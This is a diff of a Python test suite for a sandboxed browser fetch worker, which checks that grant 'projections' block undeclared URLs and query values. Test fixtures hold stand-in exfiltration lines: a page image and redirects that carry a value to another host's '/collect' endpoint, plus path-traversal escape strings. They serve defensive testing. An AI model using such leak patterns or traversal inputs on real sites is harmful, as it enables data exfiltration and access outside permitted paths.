@@ -56,6 +56,8 @@ from app.workers.fetch_channel import (
     FetchChannelError,
     FetchControlClient,
     FetchWorkerConfiguration,
+    GrantProjection,
+    ProjectionEntry,
     source_admits,
 )
 
@@ -64,12 +66,30 @@ PUBLIC = {"granted.test": "93.184.216.34", "other.test": "93.184.216.35", "rebin
           "big.test": "93.184.216.37"}
 
 
+# the exact pure navigations ("no source data") the in-thread cases open
+NAVIGATIONS = ("https://granted.test/", "https://granted.test/home", "https://granted.test/away",
+               "https://granted.test/big", "https://granted.test/mid", "https://granted.test/slow",
+               "https://granted.test/docs/page", "https://granted.test/docs/leave", "https://granted.test/docs/final",
+               "https://private.test/")
+
+
+def pure_navigation(sources, urls=NAVIGATIONS):
+    return GrantProjection(entries=tuple(ProjectionEntry(url=url) for url in urls if source_admits(sources, url)))
+
+
 def grant(**changes):
     values = {"sources": ("https://granted.test/",), "recipients": ("granted.test",),
               "max_response_bytes": 256 * 1024, "max_total_bytes": 1024 * 1024, "max_requests": 16,
               "max_redirects": 3, "ttl_ms": 30_000}
     values.update(changes)
+    if "projection" not in values:
+        values["projection"] = pure_navigation(values["sources"])
     return BrowserGrant(**values)
+
+
+def register(subject, value, url=None, excluded_hosts=()):
+    """Register `value` for one navigation (its first projection entry unless named)."""
+    return subject.control.register(value, url or value.projection.entries[0].url, excluded_hosts)
 
 
 # --- profiles and configurations -----------------------------------------------------
@@ -189,6 +209,8 @@ PAGES = {
     "/docs/page": (200, {"content-type": "text/plain\x01"}, b"page"),
     "/big": (200, {"content-type": "text/html"}, b"x" * (300 * 1024)),
     "/mid": (200, {"content-type": "text/html"}, b"m" * (200 * 1024)),
+    "/search": (200, {"content-type": "text/html"}, b"<title>Search</title>results"),
+    "/leak": (302, {"location": "https://other.test/collect?v=deeptwin"}, b""),
 }
 
 
@@ -251,7 +273,7 @@ def _code(subject, identifier, url, kind="navigation"):
 
 
 def test_a_granted_navigation_is_fetched_with_only_its_status_type_and_body(fetch_service):
-    identifier = fetch_service.control.register(grant())
+    identifier = register(fetch_service, grant())
     response = _fetch(fetch_service, identifier, "https://granted.test/")
     assert (response.status, response.final_url, response.redirects) == (200, "https://granted.test/", 0)
     assert response.content_type == "text/html; charset=utf-8" and response.body == b"<title>Home</title>hi"
@@ -265,7 +287,7 @@ def test_a_granted_navigation_is_fetched_with_only_its_status_type_and_body(fetc
 
 
 def test_hosts_sources_and_routes_outside_the_grant_are_denied(fetch_service):
-    identifier = fetch_service.control.register(grant(sources=("https://granted.test/docs/",),
+    identifier = register(fetch_service, grant(sources=("https://granted.test/docs/",),
                                                       recipients=("granted.test", "private.test", "mixed.test")))
     assert _code(fetch_service, identifier, "https://granted.test/") == "grant_denied"  # outside the sources
     assert _fetch(fetch_service, identifier, "https://granted.test/", kind="subresource").status == 200
@@ -281,13 +303,13 @@ def test_hosts_sources_and_routes_outside_the_grant_are_denied(fetch_service):
 
 
 def test_redirects_are_revalidated_against_recipients_and_sources(fetch_service):
-    identifier = fetch_service.control.register(grant(sources=("https://granted.test/docs/", "https://granted.test/"),
+    identifier = register(fetch_service, grant(sources=("https://granted.test/docs/", "https://granted.test/"),
                                                       recipients=("granted.test",)))
     followed = _fetch(fetch_service, identifier, "https://granted.test/home")
     assert (followed.final_url, followed.redirects, followed.body) == ("https://granted.test/docs/final", 1,
                                                                        b"<title>Final</title>final")
     assert _code(fetch_service, identifier, "https://granted.test/away") == "redirect_denied"
-    other = fetch_service.control.register(grant(sources=("https://granted.test/docs/",)))
+    other = register(fetch_service, grant(sources=("https://granted.test/docs/",)))
     # a dot segment (literal or encoded) never walks out of a source prefix
     for escape in ("https://granted.test/docs/../outside", "https://granted.test/docs/%2e%2e/outside",
                    "https://granted.test/docs/%2E./outside", "https://granted.test/docs%2f..%2foutside"):
@@ -297,31 +319,31 @@ def test_redirects_are_revalidated_against_recipients_and_sources(fetch_service)
 
 def test_navigation_redirect_leaving_the_sources_is_denied(fetch_service, monkeypatch):
     monkeypatch.setitem(PAGES, "/docs/leave", (302, {"location": "https://granted.test/elsewhere/"}, b""))
-    identifier = fetch_service.control.register(grant(sources=("https://granted.test/docs/",)))
+    identifier = register(fetch_service, grant(sources=("https://granted.test/docs/",)))
     assert _code(fetch_service, identifier, "https://granted.test/docs/leave") == "redirect_denied"
     # the same hop is a recipient-clean redirect for a subresource
     assert _fetch(fetch_service, identifier, "https://granted.test/docs/leave", "subresource").status == 404
 
 
 def test_byte_request_and_lifetime_limits_refuse(fetch_service):
-    identifier = fetch_service.control.register(grant(max_response_bytes=256 * 1024, max_total_bytes=300 * 1024,
+    identifier = register(fetch_service, grant(max_response_bytes=256 * 1024, max_total_bytes=300 * 1024,
                                                       max_requests=4))
     assert _code(fetch_service, identifier, "https://granted.test/big") == "too_large"  # one response
     assert len(_fetch(fetch_service, identifier, "https://granted.test/mid").body) == 200 * 1024
     assert _code(fetch_service, identifier, "https://granted.test/mid") == "too_large"  # the total budget
     assert _fetch(fetch_service, identifier, "https://granted.test/").status == 200  # the 4th request
     assert _code(fetch_service, identifier, "https://granted.test/") == "grant_denied"  # the 5th request
-    later = fetch_service.control.register(grant(ttl_ms=5_000))
+    later = register(fetch_service, grant(ttl_ms=5_000))
     fetch_service.clock[0] += 5.0
     assert _code(fetch_service, later, "https://granted.test/") == "grant_denied"  # expired
-    slow = fetch_service.control.register(grant())
+    slow = register(fetch_service, grant())
     assert _code(fetch_service, slow, "https://granted.test/slow") == "timeout"
     assert fetch_service.control.revoke(identifier).body_bytes == 200 * 1024 + len(PAGES["/"][2])
 
 
 def test_grant_registration_refuses_the_product_origin_and_unknown_ids(fetch_service):
     with pytest.raises(FetchChannelError) as refused:
-        fetch_service.control.register(grant(), excluded_hosts=("granted.test",))
+        register(fetch_service, grant(), excluded_hosts=("granted.test",))
     assert refused.value.code == "grant_denied"
     with pytest.raises(FetchChannelError) as unknown:
         fetch_service.control.revoke("0" * 64)
@@ -330,7 +352,7 @@ def test_grant_registration_refuses_the_product_origin_and_unknown_ids(fetch_ser
 
 
 def test_an_unprintable_content_type_is_replaced(fetch_service):
-    identifier = fetch_service.control.register(grant(sources=("https://granted.test/docs/",)))
+    identifier = register(fetch_service, grant(sources=("https://granted.test/docs/",)))
     assert _fetch(fetch_service, identifier, "https://granted.test/docs/page").content_type == "application/octet-stream"
 
 
@@ -441,15 +463,100 @@ def test_worker_side_refusals_are_the_brokers_closed_codes(browser_client):
         assert (refused.value.code, refused.value.sent) == (code, True)
 
 
-# --- dispatch through a compiled graph ------------------------------------------------
+# --- dispatch through a compiled graph, authorized by the owner's grant record ---------
 
-def browser_run_subject(path, *, max_output_bytes=9 * 1024 * 1024):
-    from app.tests.test_scheduler_attempt_dispatch import started
+def _transport(granted, client, *, op="read", url="https://granted.test/", excluded_hosts=()):
+    from app.runtime.browser_attempt_transport import BrowserAttemptTransport
 
-    return started(path, max_output_bytes=max_output_bytes)
+    subject = granted.subject
+    return BrowserAttemptTransport.build(
+        domain_store=subject.domain, ledger=subject.ledger, compiled=subject.compiled, node_id="writer",
+        binding_id="source-read", client=client, request=BrowserRequest(op=op, url=url, max_text_bytes=4_096),
+        grants=granted.grants, excluded_hosts=excluded_hosts)
 
 
-def browser_compiled(subject, tool="browser_read"):
+def test_a_graph_node_with_a_browser_tool_reaches_the_worker_and_seals_its_result(tmp_path, browser_client):
+    from app.runtime import node_attempts as na
+    from app.runtime import scheduler as sch
+    from app.tests.support.browser_grant_chain import dispatch, granted_run, owner_vault
+    from app.tests.test_runtime_budget_dispatch import budget_row
+
+    with owner_vault(tmp_path) as vault:
+        granted = granted_run(vault)
+        subject, run = granted.subject, granted.run
+        outcome = dispatch(granted, _transport(granted, browser_client.client))
+        ref = dict(outcome.result_refs)[sch.execution_identity(run.run_id, "writer", 0)]
+        record = subject.domain.get(ref).body
+        content = record["content"]
+        assert (content["schema_version"], content["tool_id"], content["operation"]) == (
+            "browser-tool-output-v1", "browser_read", "read")
+        assert content["observation"]["final_url"] == "https://granted.test/"
+        # the sealed output names the owner's grant record it ran under
+        assert granted.grant_ref.as_dict() in record["parent_refs"]
+        dispatched = granted.grants.for_dispatch(granted.grant_ref, tool_id="browser_read", version="1.0.0")
+        # the session ran under exactly the grant built from the owner's record
+        assert content["observation"]["grant_sha256"] == dispatched.grant.digest
+        assert [entry.as_dict() for entry in dispatched.grant.projection.entries] == \
+            granted.view["projection"]["entries"]
+        blob = content["output"]["blob"]
+        assert (blob["sha256"], blob["size"]) == (sha256(b"hi").hexdigest(), 2)
+        attempt_id = na.attempt_identity(run.run_id, "writer", 0, 0)
+        assert subject.ledger.get_attempt(attempt_id)["terminal_outcome"] == "succeeded"
+        calls = subject.ledger.tool_calls_for_attempt(attempt_id)
+        assert [(item["tool_id"], item["state"]) for item in calls] == [("browser_read", "succeeded")]
+        row = budget_row(subject, na.reservation_identity(attempt_id))
+        assert row["state"] == "finalized" and row["actual_tool_calls"] == 1
+
+
+def test_a_worker_refusal_is_a_denied_attempt_with_final_usage(tmp_path, browser_client):
+    from app.runtime import node_attempts as na
+    from app.tests.support.browser_grant_chain import (
+        dispatch,
+        grant_command,
+        granted_run,
+        owner_vault,
+    )
+
+    with owner_vault(tmp_path) as vault:
+        granted = granted_run(vault, tool="browser_navigate", command=grant_command(
+            entries=[{"url": "https://granted.test/away", "parameters": []}], data_sources=[]))
+        transport = _transport(granted, browser_client.client, url="https://granted.test/away", op="navigate")
+        with pytest.raises(SchedulerError, match="node_failed:writer"):
+            dispatch(granted, transport)
+        attempt_id = na.attempt_identity(granted.run.run_id, "writer", 0, 0)
+        attempt = granted.subject.ledger.get_attempt(attempt_id)
+        assert (attempt["terminal_outcome"], attempt["usage_finality"]) == ("denied", "final")
+        assert [item["state"] for item in granted.subject.ledger.tool_calls_for_attempt(attempt_id)] == ["failed"]
+
+
+def test_no_reachable_browser_worker_is_definitely_not_sent(tmp_path, fetch_service):
+    from app.runtime import node_attempts as na
+    from app.tests.support.browser_grant_chain import dispatch, granted_run, owner_vault
+
+    def refused():
+        raise OSError("no worker")
+
+    with owner_vault(tmp_path) as vault:
+        granted = granted_run(vault)
+        transport = _transport(granted, BrowserClient(refused, fetch=fetch_service.control))
+        with pytest.raises(SchedulerError, match="node_failed:writer"):
+            dispatch(granted, transport)
+        ledger = granted.subject.ledger
+        attempt_id = na.attempt_identity(granted.run.run_id, "writer", 0, 0)
+        # the ledger keeps a committed send intent as possibly sent; the vouched effect is journaled
+        assert ledger.get_attempt(attempt_id)["terminal_outcome"] == "outcome_unknown"
+        status = ledger.dispatch_status(na._command_identity(attempt_id, "send"))
+        assert "definitely_not_sent" in json.dumps(status, default=str)
+        assert [item["state"] for item in ledger.tool_calls_for_attempt(attempt_id)] == ["failed"]
+
+
+def test_build_refuses_mismatched_tools_operations_grants_and_the_product_origin(tmp_path, browser_client):
+    from app.runtime.browser_attempt_transport import BrowserAttemptTransport
+    from app.tests.support.browser_grant_chain import (
+        compiled_with_grant,
+        granted_run,
+        owner_vault,
+    )
     from app.tests.test_graph_contract import (
         authority_with,
         compile_value,
@@ -457,123 +564,39 @@ def browser_compiled(subject, tool="browser_read"):
     )
     from app.tests.test_graph_execution import linear_graph
 
-    subject.compiled = compile_value(linear_graph(), compilation_authority=authority_with([
-        trusted_tool(tool_id=tool, version="1.0.0")]))
-    return subject.compiled
-
-
-def _dispatch(subject, run, transport):
-    from app.runtime import node_attempts as na
-    from app.tests.test_scheduler_attempt_dispatch import build, handlers
-
-    dispatcher = na.NodeAttemptDispatcher.build(
-        ledger=subject.ledger, budget_book=subject.book, owner=subject.owner,
-        bindings={"writer": na.AttemptBinding.create(
-            envelope_ref=subject.refs.envelope, profile_ref=subject.refs.profile,
-            budget_policy_ref=subject.refs.budget, deadline_at_ms=60_000, lease_duration_ms=60_000,
-            model_calls=1, tool_calls=1, node_visits=1, loop_rounds=0, output_bytes=transport.output_bytes_bound,
-            candidates=0, api_microunits=None, principal=subject.principal, grant=subject.grant)},
-        transport=transport)
-    return build(subject, run, dispatcher, handlers(subject, []), compiled=subject.compiled).run()
-
-
-def _transport(subject, client, *, tool="browser_read", op="read", url="https://granted.test/", value=None):
-    from app.runtime.browser_attempt_transport import BrowserAttemptTransport
-
-    return BrowserAttemptTransport.build(
-        domain_store=subject.domain, ledger=subject.ledger, compiled=browser_compiled(subject, tool),
-        node_id="writer", binding_id="source-read", client=client,
-        request=BrowserRequest(op=op, url=url, max_text_bytes=4_096), grant=value or grant())
-
-
-def test_a_graph_node_with_a_browser_tool_reaches_the_worker_and_seals_its_result(tmp_path, browser_client):
-    from app.runtime import node_attempts as na
-    from app.runtime import scheduler as sch
-    from app.tests.test_runtime_budget_dispatch import budget_row
-
-    subject, run = browser_run_subject(tmp_path / "ledger")
-    transport = _transport(subject, browser_client.client)
-    outcome = _dispatch(subject, run, transport)
-    ref = dict(outcome.result_refs)[sch.execution_identity(run.run_id, "writer", 0)]
-    content = subject.domain.get(ref).body["content"]
-    assert (content["schema_version"], content["tool_id"], content["operation"]) == (
-        "browser-tool-output-v1", "browser_read", "read")
-    assert content["observation"]["final_url"] == "https://granted.test/"
-    assert content["observation"]["grant_sha256"] == grant().digest
-    blob = content["output"]["blob"]
-    assert (blob["sha256"], blob["size"]) == (sha256(b"hi").hexdigest(), 2)
-    attempt_id = na.attempt_identity(run.run_id, "writer", 0, 0)
-    assert subject.ledger.get_attempt(attempt_id)["terminal_outcome"] == "succeeded"
-    calls = subject.ledger.tool_calls_for_attempt(attempt_id)
-    assert [(item["tool_id"], item["state"]) for item in calls] == [("browser_read", "succeeded")]
-    row = budget_row(subject, na.reservation_identity(attempt_id))
-    assert row["state"] == "finalized" and row["actual_tool_calls"] == 1
-
-
-def test_a_worker_refusal_is_a_denied_attempt_with_final_usage(tmp_path, browser_client):
-    from app.runtime import node_attempts as na
-
-    subject, run = browser_run_subject(tmp_path / "ledger")
-    transport = _transport(subject, browser_client.client, url="https://granted.test/away", op="navigate",
-                           tool="browser_navigate")
-    with pytest.raises(SchedulerError, match="node_failed:writer"):
-        _dispatch(subject, run, transport)
-    attempt = subject.ledger.get_attempt(na.attempt_identity(run.run_id, "writer", 0, 0))
-    assert (attempt["terminal_outcome"], attempt["usage_finality"]) == ("denied", "final")
-    calls = subject.ledger.tool_calls_for_attempt(na.attempt_identity(run.run_id, "writer", 0, 0))
-    assert [item["state"] for item in calls] == ["failed"]
-
-
-def test_no_reachable_browser_worker_is_definitely_not_sent(tmp_path, fetch_service):
-    from app.runtime import node_attempts as na
-
-    def refused():
-        raise OSError("no worker")
-
-    subject, run = browser_run_subject(tmp_path / "ledger")
-    transport = _transport(subject, BrowserClient(refused, fetch=fetch_service.control))
-    with pytest.raises(SchedulerError, match="node_failed:writer"):
-        _dispatch(subject, run, transport)
-    attempt_id = na.attempt_identity(run.run_id, "writer", 0, 0)
-    attempt = subject.ledger.get_attempt(attempt_id)
-    # the ledger keeps a committed send intent as possibly sent; the vouched effect is journaled
-    assert attempt["terminal_outcome"] == "outcome_unknown"
-    status = subject.ledger.dispatch_status(na._command_identity(attempt_id, "send"))
-    assert "definitely_not_sent" in json.dumps(status, default=str)
-    assert [item["state"] for item in subject.ledger.tool_calls_for_attempt(attempt_id)] == ["failed"]
-
-
-def test_build_refuses_mismatched_tools_operations_grants_and_the_product_origin(tmp_path, browser_client):
-    from app.runtime.browser_attempt_transport import BrowserAttemptTransport
-
-    subject, _run = browser_run_subject(tmp_path / "ledger")
-    compiled = browser_compiled(subject, "browser_read")
-    base = {"domain_store": subject.domain, "ledger": subject.ledger, "compiled": compiled, "node_id": "writer",
-            "binding_id": "source-read", "client": browser_client.client}
-    with pytest.raises(ValueError):  # the operation is not the bound tool's
-        BrowserAttemptTransport.build(**base, request=BrowserRequest(op="screenshot", url="https://granted.test/"),
-                                      grant=grant())
-    with pytest.raises(ValueError):  # outside the grant's sources
-        BrowserAttemptTransport.build(**base, request=BrowserRequest(op="read", url="https://other.test/"),
-                                      grant=grant())
-    with pytest.raises(ValueError):  # the product's own host is never a recipient
-        BrowserAttemptTransport.build(**base, request=BrowserRequest(op="read", url="https://granted.test/"),
-                                      grant=grant(), excluded_hosts=("granted.test",))
-    with pytest.raises(ValueError):  # a tool that is not a browser tool
-        BrowserAttemptTransport.build(**{**base, "compiled": browser_compiled(subject, "text_profile")},
-                                      request=BrowserRequest(op="read", url="https://granted.test/"), grant=grant())
-    with pytest.raises(ValueError):  # a browser tool whose definition claims another effect
-        from app.tests.test_graph_contract import (
-            authority_with,
-            compile_value,
-            trusted_tool,
-        )
-        from app.tests.test_graph_execution import linear_graph
-
-        external = compile_value(linear_graph(), compilation_authority=authority_with([
-            trusted_tool("external_reversible", tool_id="browser_read", version="1.0.0")]))
-        BrowserAttemptTransport.build(**{**base, "compiled": external},
-                                      request=BrowserRequest(op="read", url="https://granted.test/"), grant=grant())
+    with owner_vault(tmp_path) as vault:
+        granted = granted_run(vault)
+        subject = granted.subject
+        base = {"domain_store": subject.domain, "ledger": subject.ledger, "compiled": subject.compiled,
+                "node_id": "writer", "binding_id": "source-read", "client": browser_client.client,
+                "grants": granted.grants}
+        home = BrowserRequest(op="read", url="https://granted.test/")
+        assert BrowserAttemptTransport.build(**base, request=home).effect_class == "read"
+        with pytest.raises(ValueError):  # the operation is not the bound tool's
+            BrowserAttemptTransport.build(**base, request=BrowserRequest(op="screenshot", url="https://granted.test/"))
+        with pytest.raises(ValueError):  # outside the grant's sources
+            BrowserAttemptTransport.build(**base, request=BrowserRequest(op="read", url="https://other.test/"))
+        with pytest.raises(ValueError):  # under a source, but not an exact projection entry
+            BrowserAttemptTransport.build(**base, request=BrowserRequest(op="read", url="https://granted.test/x"))
+        with pytest.raises(ValueError):  # a value the owner never declared
+            BrowserAttemptTransport.build(**base, request=BrowserRequest(
+                op="read", url="https://granted.test/search?q=private-diagnosis"))
+        assert BrowserAttemptTransport.build(**base, request=BrowserRequest(
+            op="read", url="https://granted.test/search?q=%EA%B3%B5%EA%B0%9C%20%EC%9E%90%EB%A3%8C"))
+        with pytest.raises(ValueError):  # the product's own host is never a recipient
+            BrowserAttemptTransport.build(**base, request=home, excluded_hosts=("granted.test",))
+        with pytest.raises(ValueError):  # a tool that is not a browser tool
+            BrowserAttemptTransport.build(**{**base, "compiled": compiled_with_grant("text_profile", granted.grant_ref)},
+                                          request=home)
+        with pytest.raises(ValueError):  # a binding whose grant_ref is not an owner grant record
+            BrowserAttemptTransport.build(**{**base, "compiled": compile_value(linear_graph(), compilation_authority=(
+                authority_with([trusted_tool(tool_id="browser_read", version="1.0.0")])))}, request=home)
+        with pytest.raises(ValueError):  # a browser tool whose definition claims another effect
+            external = compile_value(linear_graph(), compilation_authority=authority_with([
+                trusted_tool("external_reversible", tool_id="browser_read", version="1.0.0")]))
+            BrowserAttemptTransport.build(**{**base, "compiled": external}, request=home)
+        with pytest.raises(TypeError):  # a grant object supplied in code is not an authority
+            BrowserAttemptTransport.build(**{**base, "grants": grant()}, request=home)
 
 
 def test_the_server_attaches_the_browser_tools_or_states_them_unavailable(tmp_path):
@@ -716,6 +739,18 @@ def _site_pages():
                                               "Content-Disposition": "attachment; filename=x.bin"}, b"\x00" * 64),
         ("other.test", "/landing"): (200, {"Content-Type": html}, b"<title>Other</title>other"),
         ("other.test", "/tracker.png"): (200, {"Content-Type": "image/png"}, _png((255, 255, 0))),
+        # the projection cases: a declared value in the query, and a page / a redirect that
+        # try to carry it on to another recipient
+        ("granted.test", "/search?q=deeptwin"): (200, {"Content-Type": html},
+                                                 b"<html><head><title>Search</title></head><body>found it</body></html>"),
+        ("granted.test", "/leak?q=deeptwin"): (200, {"Content-Type": html},
+                                               (b"<html><head><title>Leak</title></head><body>leak"
+                                                b"<img src='https://other.test/collect?v=deeptwin'>"
+                                                b"<img src='https://other.test/tracker.png'></body></html>")),
+        ("granted.test", "/redirect-leak?q=deeptwin"): (302, {"Location": "https://other.test/collect?v=DeepTwin"},
+                                                        b""),
+        ("other.test", "/collect?v=deeptwin"): (200, {"Content-Type": "image/png"}, _png((0, 0, 0))),
+        ("other.test", "/collect?v=DeepTwin"): (200, {"Content-Type": html}, b"<title>Collected</title>"),
         ("rebind.test", "/"): (200, {"Content-Type": html},
                                (b"<html><head><title>Rebind</title></head><body>first answer"
                                 b"<img src='/pixel.png'></body></html>")),
@@ -900,12 +935,32 @@ def _requester(base, role, plan, *, uid=CONTROL, groups=(21104, 21102)):
     return json.loads(child.stdout)
 
 
+# the exact pure navigations the real-process cases open (the projection's entries)
+REAL_NAVIGATIONS = tuple("https://granted.test" + path for path in (
+    "/", "/redirect-home", "/red", "/redirect-away", "/redirect-loopback", "/redirect-ipv6", "/redirect-private",
+    "/frame", "/download", "/big", "/slow")) + ("https://private.test/", "https://rebind.test/")
+TOPIC = sha256(b"deeptwin").hexdigest()
+
+
 def _grant(**changes):
+    """A `BrowserGrant.as_dict()` mapping; pure navigation to the entries under its sources
+    unless a projection is named."""
     values = {"sources": ["https://granted.test/"], "recipients": ["granted.test"],
               "max_response_bytes": 1024 * 1024, "max_total_bytes": 4 * 1024 * 1024, "max_requests": 32,
               "max_redirects": 3, "ttl_ms": 60_000}
     values.update(changes)
+    values.setdefault("projection", pure_navigation(tuple(values["sources"]), REAL_NAVIGATIONS).as_dict())
     return values
+
+
+def _topic_grant():
+    """`q` may carry only the declared topic value `deeptwin`; other.test is a recipient,
+    so only the projection stands between the value and that host."""
+    entries = [{"url": "https://granted.test/", "parameters": []}] + [
+        {"url": "https://granted.test" + path, "parameters": [{"name": "q", "source": "topic"}]}
+        for path in ("/search", "/leak", "/redirect-leak")]
+    return _grant(recipients=["granted.test", "other.test"], projection={
+        "entries": entries, "data_sources": [{"source_id": "topic", "value_sha256": [TOPIC]}]})
 
 
 @real_process
@@ -919,7 +974,7 @@ def test_the_real_workers_browse_the_fixture_site_only_through_the_grant(deploym
                                            "height": 200}, "grant": _grant()},
         {"name": "ungranted_local", "request": {"op": "navigate", "url": "https://other.test/landing"},
          "grant": _grant()},
-        {"name": "ungranted_worker", "skip_local_check": True,
+        {"name": "ungranted_worker", "skip_local_check": True, "register_url": "https://granted.test/",
          "request": {"op": "navigate", "url": "https://other.test/landing"}, "grant": _grant()},
         {"name": "redirect_away", "request": {"op": "navigate", "url": "https://granted.test/redirect-away"},
          "grant": _grant()},
@@ -989,13 +1044,86 @@ def test_the_real_workers_browse_the_fixture_site_only_through_the_grant(deploym
 
 
 @real_process
+def test_the_real_fetch_worker_enforces_the_grants_projection(deployment):
+    before = len(deployment.site.httpd.seen)
+    cases = [
+        # a declared value in the one parameter that may carry it: fetched as is
+        {"name": "declared", "request": {"op": "read", "url": "https://granted.test/search?q=deeptwin"},
+         "grant": _topic_grant()},
+        # an undeclared value: control refuses before anything is sent …
+        {"name": "undeclared_local", "request": {"op": "navigate",
+                                                 "url": "https://granted.test/search?q=private-diagnosis"},
+         "grant": _topic_grant()},
+        # … and, with control's pre-check bypassed, the fetch service refuses it at registration
+        {"name": "undeclared_register", "skip_local_check": True,
+         "request": {"op": "navigate", "url": "https://granted.test/search?q=private-diagnosis"},
+         "grant": _topic_grant()},
+        # a browser that asks for another navigation than the registered one: the fetch
+        # service refuses the navigation itself
+        {"name": "undeclared_navigation", "skip_local_check": True, "register_url": "https://granted.test/",
+         "request": {"op": "navigate", "url": "https://granted.test/search?q=private-diagnosis"},
+         "grant": _topic_grant()},
+        # the same value spelled another way (`+`, a second parameter) is not the entry
+        {"name": "respelled", "skip_local_check": True, "register_url": "https://granted.test/",
+         "request": {"op": "navigate", "url": "https://granted.test/search?q=deeptwin&x=1"},
+         "grant": _topic_grant()},
+        # a path the pure-navigation projection does not list, under a granted source
+        {"name": "unlisted_path", "request": {"op": "navigate", "url": "https://granted.test/private-notes"},
+         "grant": _grant()},
+        # derived requests: the page's image carrying the value to another recipient is
+        # refused, its value-free image is not; a redirect carrying it (another case) is refused
+        {"name": "derived_image", "request": {"op": "read", "url": "https://granted.test/leak?q=deeptwin"},
+         "grant": _topic_grant()},
+        {"name": "derived_redirect", "request": {"op": "navigate",
+                                                 "url": "https://granted.test/redirect-leak?q=deeptwin"},
+         "grant": _topic_grant()},
+    ]
+    results = _requester(deployment.base, "request", {"cases": cases})
+    declared = results["declared"]
+    assert declared["ok"] is True and declared["title"] == "Search" and "found it" in declared["text"]
+    assert declared["final_url"] == "https://granted.test/search?q=deeptwin"
+    assert results["undeclared_local"] == {"ok": False, "code": "projection_denied", "sent": False}
+    assert results["undeclared_register"] == {"ok": False, "code": "projection_denied", "sent": True,
+                                              "stage": "register"}
+    assert results["undeclared_navigation"]["ok"] is False
+    assert results["undeclared_navigation"]["code"] == "projection_denied"
+    assert results["respelled"]["code"] == "projection_denied"
+    assert results["unlisted_path"] == {"ok": False, "code": "projection_denied", "sent": False}
+    leak = results["derived_image"]
+    assert leak["ok"] is True and leak["title"] == "Leak" and leak["denied"] >= 1 and leak["allowed"] >= 2
+    assert results["derived_redirect"]["ok"] is False
+    assert results["derived_redirect"]["code"] == "projection_denied"
+    seen = [(host, path) for host, path, _headers in deployment.site.httpd.seen[before:]]
+    # the fixture got the declared request, the value-free image, and never the value
+    # toward another host nor an undeclared value at all
+    assert ("granted.test", "/search?q=deeptwin") in seen and ("other.test", "/tracker.png") in seen
+    assert not any(path.startswith("/collect") for _host, path in seen)
+    assert not any("private-diagnosis" in path or "private-notes" in path for _host, path in seen)
+    for event in deployment.browser.events() + deployment.fetch.events():
+        assert set(event) <= {"event", "class", "outcome", "pair"}
+
+
+@real_process
 def test_a_graph_node_reaches_the_real_worker_through_the_attempt_transport(deployment):
     result = _requester(deployment.base, "dispatch", {
-        "tool": "browser_read", "request": {"op": "read", "url": "https://granted.test/", "max_text_bytes": 4096},
-        "grant": _grant()})
-    assert result["result"]["tool_id"] == "browser_read" and result["result"]["title"] == "Fixture Home"
-    assert result["result"]["output_blob"]["size"] > 0 and "Hello fixture" in result["output_text"]
+        "tool": "browser_read", "request": {"op": "read", "url": "https://granted.test/search?q=deeptwin",
+                                            "max_text_bytes": 4096}})
+    assert result["result"]["tool_id"] == "browser_read" and result["result"]["title"] == "Search"
+    assert result["result"]["output_blob"]["size"] > 0 and "found it" in result["output_text"]
+    assert result["result"]["grant_parent"] is True  # sealed under the owner's grant record
     assert result["tool_calls"] == [{"state": "succeeded", "tool_id": "browser_read"}]
+
+
+@real_process
+def test_a_revoked_grant_is_refused_at_dispatch_before_anything_is_sent(deployment):
+    before = len(deployment.site.httpd.seen)
+    result = _requester(deployment.base, "dispatch", {
+        "tool": "browser_read", "revoke": True,
+        "request": {"op": "read", "url": "https://granted.test/", "max_text_bytes": 4096}})
+    assert result["result"] is None and result["scheduler_error"].startswith("node_failed:writer")
+    assert result["attempt"] == {"terminal_outcome": "denied", "usage_finality": "final"}
+    assert result["tool_calls"] == [{"state": "failed", "tool_id": "browser_read"}]
+    assert deployment.site.httpd.seen[before:] == []  # nothing reached the site
 
 
 @real_process
